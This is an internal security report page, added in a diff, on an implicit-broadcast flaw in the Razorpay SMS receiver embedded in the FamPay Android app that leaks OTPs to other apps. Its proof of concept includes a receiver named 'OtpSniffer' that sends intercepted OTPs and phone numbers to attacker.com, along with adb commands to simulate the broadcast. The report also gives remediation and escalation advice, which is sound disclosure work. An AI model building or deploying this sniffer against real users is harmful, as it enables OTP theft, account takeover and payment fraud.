@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Chain F Report — Razorpay OTP Broadcast | FamPay Security</title>
+<style>
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{background:#0a0a0f;color:#e0e0e0;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;padding:24px 16px;max-width:760px;margin:0 auto;font-size:13px;line-height:1.7}
+  h1{font-size:22px;font-weight:900;color:#fff;margin-bottom:4px}
+  h2{font-size:14px;font-weight:700;color:#00b0ff;margin:28px 0 10px;letter-spacing:0.3px;text-transform:uppercase}
+  h3{font-size:12px;font-weight:700;color:#aaa;margin:16px 0 6px;text-transform:uppercase;letter-spacing:0.3px}
+  p{color:#bbb;margin-bottom:10px}
+  .badge{display:inline-block;font-size:10px;background:#001a2a;border:1px solid #00b0ff;color:#00b0ff;padding:3px 12px;border-radius:20px;letter-spacing:1px;margin-bottom:12px}
+  .severity-bar{display:flex;align-items:center;gap:12px;background:#13131a;border:1px solid #2a2a3a;border-radius:8px;padding:16px 20px;margin-bottom:20px;flex-wrap:wrap}
+  .sev-label{font-size:11px;color:#666;text-transform:uppercase;letter-spacing:0.5px}
+  .sev-high{font-size:28px;font-weight:900;color:#00b0ff}
+  .divider{width:1px;height:40px;background:#2a2a3a}
+  .meta-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:20px}
+  .meta-card{background:#13131a;border:1px solid #2a2a3a;border-radius:8px;padding:14px}
+  .meta-card .mk{font-size:10px;color:#555;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:4px}
+  .meta-card .mv{font-size:12px;color:#e0e0e0;font-family:monospace;word-break:break-all}
+  code{background:#1a1a2a;border:1px solid #2a2a3a;padding:2px 6px;border-radius:3px;font-family:monospace;font-size:11px;color:#00e676}
+  pre{background:#0d0d14;border:1px solid #2a2a3a;border-radius:6px;padding:14px;overflow-x:auto;font-size:11px;color:#00e676;line-height:1.6;margin:10px 0}
+  .attack-chain{background:#13131a;border:1px solid #2a2a3a;border-radius:8px;padding:16px;margin:10px 0}
+  .chain-step{display:flex;gap:12px;align-items:flex-start;padding:8px 0;border-bottom:1px solid #1a1a2a}
+  .chain-step:last-child{border:none}
+  .step-num{background:#00b0ff;color:#000;font-size:10px;font-weight:900;padding:2px 7px;border-radius:10px;min-width:24px;text-align:center;margin-top:1px}
+  .step-body .step-title{font-size:12px;color:#fff;font-weight:700;margin-bottom:2px}
+  .step-body .step-desc{font-size:11px;color:#888}
+  .fix-card{background:#0d1a0d;border:1px solid #1a3a1a;border-radius:8px;padding:14px;margin:8px 0}
+  .fix-card h4{font-size:11px;color:#00e676;margin-bottom:8px;text-transform:uppercase;letter-spacing:0.3px}
+  .adb-box{background:#0d0d14;border:1px solid #2a2a3a;border-radius:6px;padding:14px;margin:10px 0}
+  .adb-label{font-size:9px;color:#555;margin-bottom:8px;letter-spacing:0.5px;text-transform:uppercase}
+  .tag{display:inline-block;font-size:9px;background:#1a1a2a;border:1px solid #2a2a3a;color:#448aff;padding:1px 6px;border-radius:3px;margin-right:4px}
+  .back-links{display:flex;gap:16px;font-size:11px;margin-top:28px;flex-wrap:wrap}
+  .back-links a{color:#448aff;text-decoration:none}
+  .highlight{background:#001a2a;border-left:3px solid #00b0ff;padding:10px 14px;border-radius:0 6px 6px 0;margin:10px 0;font-size:12px;color:#88ddff}
+</style>
+</head>
+<body>
+
+<span class="badge">INTERNAL SECURITY REPORT — CHAIN F</span>
+<h1>Razorpay SmsReceiver — Implicit Broadcast OTP Interception</h1>
+<p style="color:#666;font-size:11px;margin-bottom:20px">FamPay Android v4.0.5.7 · Oversecured Finding #4 (Implicit Broadcast) · March 2026</p>
+
+<div class="severity-bar">
+  <div><div class="sev-label">Severity</div><div class="sev-high">HIGH</div></div>
+  <div class="divider"></div>
+  <div><div class="sev-score" style="font-size:22px;font-weight:700;color:#00b0ff">7.8</div></div>
+  <div class="divider"></div>
+  <div><div class="sev-score">OTP / 2FA Bypass Potential</div></div>
+</div>
+
+<div class="meta-grid">
+  <div class="meta-card"><div class="mk">Vulnerable Component</div><div class="mv">com.razorpay.SmsReceiver</div></div>
+  <div class="meta-card"><div class="mk">Broadcast Action</div><div class="mv">com.razorpay.events.SMS_PROCESSED</div></div>
+  <div class="meta-card"><div class="mk">Leaked Data</div><div class="mv">extra_sender (phone number) + extra_message (OTP content)</div></div>
+  <div class="meta-card"><div class="mk">Requirement</div><div class="mv">SMS permission on device (Android ≤ 8.0 no permission needed)</div></div>
+</div>
+
+<h2>Executive Summary (Non-Technical)</h2>
+<p>When FamPay processes an SMS (for example, an OTP sent during a payment), Razorpay's code sends a system-wide announcement — an "implicit broadcast" — containing the full SMS text and sender phone number. Because this announcement is sent to all apps on the device (not just FamPay), any malicious app can listen for it and capture OTPs in real time.</p>
+
+<div class="highlight">Imagine a bank teller reading your OTP out loud in a crowded room — instead of whispering it only to you. Any attacker app that is "in the room" (installed on the device) hears the OTP. They can then use it to authorize transactions before you do.</div>
+
+<p>This effectively breaks Two-Factor Authentication: an attacker who has stolen a user's password (via Chain A / Vuln #16 auth token) and has an app on the device can intercept the OTP to fully take over the account.</p>
+
+<h2>Vulnerable Code</h2>
+<h3>SmsReceiver.java (Lines 30–33)</h3>
+<pre>// After SMS is received and parsed:
+Intent broadcastIntent = new Intent("com.razorpay.events.SMS_PROCESSED");
+broadcastIntent.putExtra("extra_sender", senderAddress);    // phone number
+broadcastIntent.putExtra("extra_message", messageBody);     // full SMS with OTP
+context.sendBroadcast(broadcastIntent);                     // sent to ALL apps</pre>
+<p><strong>No permission protection:</strong> <code>sendBroadcast(intent)</code> is called without a <code>receiverPermission</code> parameter. Any app can register for <code>com.razorpay.events.SMS_PROCESSED</code>.</p>
+
+<h2>Attack Chain</h2>
+<div class="attack-chain">
+  <div class="chain-step">
+    <div class="step-num">1</div>
+    <div class="step-body">
+      <div class="step-title">Attacker installs malicious app on victim's device</div>
+      <div class="step-desc">Registers a BroadcastReceiver for <code>com.razorpay.events.SMS_PROCESSED</code> — no permissions required</div>
+    </div>
+  </div>
+  <div class="chain-step">
+    <div class="step-num">2</div>
+    <div class="step-body">
+      <div class="step-title">Victim initiates payment in FamPay</div>
+      <div class="step-desc">Razorpay sends OTP via SMS to the registered phone number</div>
+    </div>
+  </div>
+  <div class="chain-step">
+    <div class="step-num">3</div>
+    <div class="step-body">
+      <div class="step-title">FamPay's SmsReceiver reads the OTP</div>
+      <div class="step-desc">Sends implicit broadcast with full SMS text and sender number</div>
+    </div>
+  </div>
+  <div class="chain-step">
+    <div class="step-num">4</div>
+    <div class="step-body">
+      <div class="step-title">Malicious app receives the broadcast</div>
+      <div class="step-desc">Captures OTP from <code>extra_message</code>. Sends it to attacker's server via network.</div>
+    </div>
+  </div>
+  <div class="chain-step">
+    <div class="step-num">5</div>
+    <div class="step-body">
+      <div class="step-title">Attacker uses OTP to complete fraudulent transaction</div>
+      <div class="step-desc">Combined with stolen auth token (Chain A/C), attacker can authorize transfers without victim's knowledge</div>
+    </div>
+  </div>
+</div>
+
+<h2>ADB Proof of Concept</h2>
+<div class="adb-box">
+  <div class="adb-label">Step 1 — Register a receiver (in attacker's APK)</div>
+  <pre>// AndroidManifest.xml
+&lt;receiver android:name=".OtpSniffer" android:exported="true"&gt;
+  &lt;intent-filter&gt;
+    &lt;action android:name="com.razorpay.events.SMS_PROCESSED" /&gt;
+  &lt;/intent-filter&gt;
+&lt;/receiver&gt;
+
+// OtpSniffer.java
+public void onReceive(Context ctx, Intent intent) {
+    String sender  = intent.getStringExtra("extra_sender");
+    String message = intent.getStringExtra("extra_message");
+    // exfiltrate to attacker server
+    new Thread(() -> {
+        try {
+            URL url = new URL("https://attacker.com/log?tag=otp&data="
+                + URLEncoder.encode(sender + "|" + message, "UTF-8"));
+            url.openConnection().getInputStream();
+        } catch(Exception e) {}
+    }).start();
+}</pre>
+</div>
+
+<div class="adb-box">
+  <div class="adb-label">Step 2 — Simulate the broadcast with ADB (validation)</div>
+  <pre># Simulate what FamPay's SmsReceiver sends after processing an OTP SMS
+adb shell am broadcast \
+  -a com.razorpay.events.SMS_PROCESSED \
+  --es extra_sender "+917001234567" \
+  --es extra_message "FamPay OTP is 482931. Do not share with anyone." \
+  com.fampay.in</pre>
+</div>
+
+<div class="adb-box">
+  <div class="adb-label">Step 3 — Verify receiver gets it (on attacker app)</div>
+  <pre># In attacker app's logcat
+adb logcat -s OtpSniffer:D
+# Should see: Received OTP: 482931 from +917001234567</pre>
+</div>
+
+<h2>Remediation</h2>
+<div class="fix-card">
+  <h4>Fix 1 — Add permission to broadcast (immediate fix)</h4>
+  <pre>// Use a custom signature-level permission
+&lt;!-- AndroidManifest.xml --&gt;
+&lt;permission
+  android:name="com.fampay.in.RECEIVE_RAZORPAY_SMS"
+  android:protectionLevel="signature" /&gt;
+
+// In code:
+context.sendBroadcast(broadcastIntent, "com.fampay.in.RECEIVE_RAZORPAY_SMS");</pre>
+</div>
+<div class="fix-card">
+  <h4>Fix 2 — Use LocalBroadcastManager (preferred)</h4>
+  <pre>// Stay within the app process — no other app can intercept
+LocalBroadcastManager.getInstance(context)
+    .sendBroadcast(broadcastIntent);
+
+// Receiver must also use LocalBroadcastManager.registerReceiver()</pre>
+</div>
+<div class="fix-card">
+  <h4>Fix 3 — Escalate to Razorpay</h4>
+  <p>This is a vulnerability in the Razorpay SDK embedded in FamPay. File a security report with Razorpay's security team at <code>security@razorpay.com</code> requesting an SDK patch. Pin to a patched version once released. This affects all apps embedding the Razorpay SDK, not just FamPay.</p>
+</div>
+
+<h2>References</h2>
+<p><span class="tag">CWE-925</span> Improper Verification of Intent by Broadcast Receiver</p>
+<p><span class="tag">CWE-287</span> Improper Authentication (OTP bypass)</p>
+<p><span class="tag">Oversecured</span> Finding #4 — Implicit Broadcast Interception</p>
+<p><span class="tag">Android</span> Security of Implicit Broadcasts — developer.android.com</p>
+
+<div class="back-links">
+  <a href="/log-viewer">&#128225; Log Viewer</a>
+  <a href="/">&#8592; All Chains</a>
+</div>
+
+</body>
+</html>
